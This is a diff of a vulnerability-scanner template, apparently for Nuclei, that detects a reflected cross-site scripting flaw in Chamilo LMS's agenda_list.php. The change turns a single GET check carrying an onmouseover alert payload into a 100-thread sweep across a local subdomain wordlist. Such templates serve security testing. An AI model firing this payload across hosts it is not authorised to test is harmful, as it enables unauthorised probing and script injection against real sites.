@@ -1,4 +1,4 @@
-id: chamilo-lms-xss-1
+id: chamilo-lms-xss
 
 info:
   name: Chamilo LMS Cross Site Scripting
@@ -8,10 +8,18 @@ info:
   tags: xss,chamilo
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"'
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+" HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
